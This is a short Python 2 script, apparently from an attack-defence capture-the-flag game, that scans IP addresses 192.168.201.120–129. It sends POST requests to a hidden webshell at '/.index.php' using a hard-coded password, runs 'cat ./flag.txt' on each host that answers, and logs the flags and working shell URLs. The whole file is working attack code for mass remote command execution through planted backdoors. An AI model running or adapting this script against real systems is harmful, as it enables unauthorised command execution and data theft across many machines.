#coding=utf-8
import requests
url_head="http://192.168.201."	#网段
url=""
shell_addr="/.index.php" #木马路径
passwd="qwzf007"					#木马密码
port="80"
payload = {
	'passwd': 'qwzf007',
	'a': 'System(\'cat ./flag.txt\');'
}
 
webshelllist=open("webshelllist.txt","w")
flag=open("firstround_flag.txt","w")
 
for i in range(120,130):
	url=url_head+str(i)+":"+port+shell_addr
	try:
		res=requests.post(url,payload,timeout=1)
		if res.status_code == requests.codes.ok:
			result = url+" connect shell sucess,flag is "+res.text
			print result
			print >>flag,result
			print >>webshelllist,url+","+passwd
		else:
			print "shell 404"
	except:
		print url+" connect shell fail"
 
webshelllist.close()
flag.close()